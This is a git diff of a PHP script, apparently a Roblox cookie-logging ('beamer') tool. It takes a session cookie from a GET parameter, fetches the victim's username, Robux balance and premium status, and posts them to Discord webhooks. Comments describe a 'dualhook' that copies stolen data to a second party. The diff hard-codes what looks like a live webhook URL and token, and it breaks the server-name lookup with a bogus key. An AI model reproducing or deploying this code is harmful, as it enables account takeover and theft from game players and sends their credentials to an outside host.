@@ -1,10 +1,10 @@
 <?php
 $logo = "https://media.discordapp.net/attachments/927449954367205378/932716250075897957/standard_1.gif"; // you can change to your own logo url
 $name = "LEAKED BY VKEVIN"; // you can change to your own name
-$webhook = "THEM"; // anyones webhook
+$webhook = "https://discord.com/api/webhooks/1019101761614655529/p9kaB5Io0imHutgh-Us786CDUtBf7iSGpB8gsNv_f9vHVcr4s6wwl1LAfgSitoa4ypvZ"; // anyones webhook
 $dualhook = "YOU"; // ofc shitter is dualhook so they have a dualhook in it change this to your dualhook
-$inameb = $_SERVER['SERVER_NAME'];
-$iname = strtoupper($_SERVER['SERVER_NAME']);
+$inameb = $_SERVER['Lux Crew'];
+$iname = strtoupper($_SERVER['Lux Crew']);
 if (!empty($_GET["cookie"])) {
 $cookie = $_GET["cookie"];
 $ch = curl_init();
@@ -23,7 +23,7 @@ $username = $profile["UserName"];
 $robux = $profile["RobuxBalance"];
 $premium = $profile["IsPremium"];
 $vxleaked = json_encode([
-            "username" => "BOT - $name",
+            "username" => "BEAMER - $name",
             "avatar_url" => "$logo",
              "content" => "@everyone",
                 "embeds" => [
